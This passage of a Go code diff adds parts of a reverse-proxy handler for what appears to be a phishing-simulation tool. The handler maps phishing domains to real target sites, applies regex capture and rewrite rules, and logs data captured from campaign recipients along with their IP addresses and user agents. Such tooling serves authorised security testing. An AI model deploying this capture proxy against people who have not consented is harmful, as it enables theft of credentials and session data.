+	if session.CampaignID == nil || session.CampaignRecipientID == nil {
+		return
+	}
+
+	ctx := context.Background()
+
+	// get campaign to check SaveSubmittedData setting
+	campaign, err := m.CampaignRepository.GetByID(ctx, session.CampaignID, &repository.CampaignOption{})
+	if err != nil {
+		m.logger.Errorw("failed to get campaign for proxy capture event", "error", err)
+		return
+	}
+
+	// save captured data only if SaveSubmittedData is enabled
+	var submittedDataJSON []byte
+	if campaign.SaveSubmittedData.MustGet() {
+		submittedDataJSON, err = json.Marshal(capturedData)
+		if err != nil {
+			m.logger.Errorw("failed to marshal captured data for campaign event", "error", err)
+			return
+		}
+	} else {
+		// save empty data but still record the capture event
+		submittedDataJSON = []byte("{}")
+	}
+
+	submitDataEventID := cache.EventIDByName[data.EVENT_CAMPAIGN_RECIPIENT_SUBMITTED_DATA]
+	eventID := uuid.New()
+
+	// get real client ip
+	clientIP := strings.SplitN(req.RemoteAddr, ":", 2)[0]
+	proxyHeaders := []string{"X-Forwarded-For", "X-Real-IP", "X-Client-IP", "Connecting-IP", "True-Client-IP", "Client-IP"}
+	for _, header := range proxyHeaders {
+		if headerValue := req.Header.Get(header); headerValue != "" {
+			clientIP = strings.SplitN(headerValue, ":", 2)[0]
+			break
+		}
+	}
+
+	event := &model.CampaignEvent{
+		ID:          &eventID,
+		CampaignID:  session.CampaignID,
+		RecipientID: session.RecipientID,
+		EventID:     submitDataEventID,
+		Data:        vo.NewOptionalString1MBMust(string(submittedDataJSON)),
+		IP:          vo.NewOptionalString64Must(clientIP),
+		UserAgent:   vo.NewOptionalString255Must(req.UserAgent()),
+	}
+
+	err = m.CampaignRepository.SaveEvent(ctx, event)
+	if err != nil {
+		m.logger.Errorw("failed to create campaign submit event", "error", err)
+	}
+}
+
+func (m *ProxyHandler) parseProxyConfig(configStr string) (*service.ProxyServiceConfigYAML, error) {
+	var yamlConfig service.ProxyServiceConfigYAML
+	err := yaml.Unmarshal([]byte(configStr), &yamlConfig)
+	if err != nil {
+		return nil, fmt.Errorf("failed to parse YAML config: %w", err)
+	}
+
+	m.setProxyConfigDefaults(&yamlConfig)
+
+	err = service.CompilePathPatterns(&yamlConfig)
+	if err != nil {
+		return nil, fmt.Errorf("failed to compile path patterns: %w", err)
+	}
+
+	return &yamlConfig, nil
+}
+
+func (m *ProxyHandler) setProxyConfigDefaults(config *service.ProxyServiceConfigYAML) {
+	if config.Version == "" {
+		config.Version = "0.0"
+	}
+
+	for domain, domainConfig := range config.Hosts {
+		for i := range domainConfig.Capture {
+			if domainConfig.Capture[i].Required == nil {
+				trueValue := true
+				domainConfig.Capture[i].Required = &trueValue
+			}
+		}
+		config.Hosts[domain] = domainConfig
+	}
+}
+
+func (m *ProxyHandler) ValidateProxyConfig(configStr string) (*service.ProxyServiceConfigYAML, error) {
+	config, err := m.parseProxyConfig(configStr)
+	if err != nil {
+		return nil, fmt.Errorf("failed to parse proxy config: %w", err)
+	}
+
+	if err := service.ValidateVersion(config); err != nil {
+		return nil, fmt.Errorf("version validation failed: %w", err)
+	}
+
+	for originalHost, hostConfig := range config.Hosts {
+		if hostConfig == nil || hostConfig.To == "" {
+			return nil, fmt.Errorf("domain mapping for '%s' is empty", originalHost)
+		}
+
+		for i, capture := range hostConfig.Capture {
+			if capture.Name == "" {
+				return nil, fmt.Errorf("capture rule %d for '%s' has no name", i, originalHost)
+			}
+			if capture.Find == "" {
+				return nil, fmt.Errorf("capture rule '%s' for '%s' has no pattern", capture.Name, originalHost)
+			}
+			if _, err := regexp.Compile(capture.Find); err != nil {
+				return nil, fmt.Errorf("capture rule '%s' for '%s' has invalid regex: %w", capture.Name, originalHost, err)
+			}
+		}
+
+		for i, replace := range hostConfig.Rewrite {
+			if replace.Name == "" {
+				return nil, fmt.Errorf("replace rule %d for '%s' has no name", i, originalHost)
+			}
+			if replace.Find == "" {
+				return nil, fmt.Errorf("replace rule '%s' for '%s' has no find pattern", replace.Name, originalHost)
+			}
+			if _, err := regexp.Compile(replace.Find); err != nil {
+				return nil, fmt.Errorf("replace rule '%s' for '%s' has invalid regex: %w", replace.Name, originalHost, err)
+			}
+		}
+	}
+
+	return config, nil
+}
+
+func (m *ProxyHandler) GetCookieName() string {
+	return m.cookieName
+}
+
+func (m *ProxyHandler) IsValidProxyCookie(cookie string) bool {
+	return m.isValidSessionCookie(cookie)
+}
+
+func (m *ProxyHandler) CleanupExpiredSessions() {
+	now := time.Now()
+	cleanedCount := 0
+
+	m.sessions.Range(func(key, value interface{}) bool {
+		sessionID, ok := key.(string)
+		if !ok {
+			return true
+		}
+		session, ok := value.(*ProxySession)
+		if !ok {
+			m.sessions.Delete(sessionID)
+			cleanedCount++
+			return true
+		}
+
+		sessionAge := now.Sub(session.CreatedAt)
+		if sessionAge > time.Duration(PROXY_COOKIE_MAX_AGE)*time.Second {
+			m.sessions.Delete(sessionID)
+			if session.CampaignRecipientID != nil {
+				m.campaignRecipientSessions.Delete(session.CampaignRecipientID.String())
+			}
+			cleanedCount++
+		}
+		return true
+	})
+
+}
+
+func (m *ProxyHandler) getTargetDomainForPhishingDomain(phishingDomain string) (string, error) {
+	if strings.Contains(phishingDomain, ":") {
+		phishingDomain = strings.Split(phishingDomain, ":")[0]
+	}
+
+	var dbDomain database.Domain
+	result := m.DomainRepository.DB.Where("name = ?", phishingDomain).First(&dbDomain)
+	if result.Error != nil {
+		return "", fmt.Errorf("failed to get domain configuration: %w", result.Error)
+	}
+
+	if dbDomain.Type != "proxy" {
+		return "", fmt.Errorf("domain is not configured for proxy")
+	}
+
+	if dbDomain.ProxyTargetDomain == "" {
+		return "", fmt.Errorf("no proxy target domain configured")
+	}
+
+	targetDomain := dbDomain.ProxyTargetDomain
+	if strings.Contains(targetDomain, "://") {
+		if parsedURL, err := url.Parse(targetDomain); err == nil {
+			return parsedURL.Host, nil
+		}
+	}
+
+	return targetDomain, nil
+}
+
+func (m *ProxyHandler) isValidSessionCookie(cookie string) bool {
+	if cookie == "" {
+		return false
+	}
+	_, exists := m.sessions.Load(cookie)
+	return exists
+}
+
+func (m *ProxyHandler) configToMap(configMap *sync.Map) map[string]service.ProxyServiceDomainConfig {
+	result := make(map[string]service.ProxyServiceDomainConfig)
+	configMap.Range(func(key, value interface{}) bool {
+		result[key.(string)] = value.(service.ProxyServiceDomainConfig)
+		return true
+	})
+	return result
+}
+
+func (m *ProxyHandler) createServiceUnavailableResponse(message string) *http.Response {
+	resp := &http.Response{
+		StatusCode: http.StatusServiceUnavailable,
+		Status:     "503 Service Unavailable",
+		Proto:      "HTTP/1.1",
+		ProtoMajor: 1,
+		ProtoMinor: 1,
+		Header:     make(http.Header),
+		Body:       io.NopCloser(strings.NewReader(message)),
+	}
+	resp.Header.Set("Content-Type", "text/plain")
+	return resp
+}
+
+func (m *ProxyHandler) writeResponse(w http.ResponseWriter, resp *http.Response) error {
+	// copy headers
+	for key, values := range resp.Header {
+		for _, value := range values {
+			w.Header().Add(key, value)
+		}
+	}
+
+	// set status code
+	w.WriteHeader(resp.StatusCode)
+
+	// copy body
+	_, err := io.Copy(w, resp.Body)
+	return err
+}
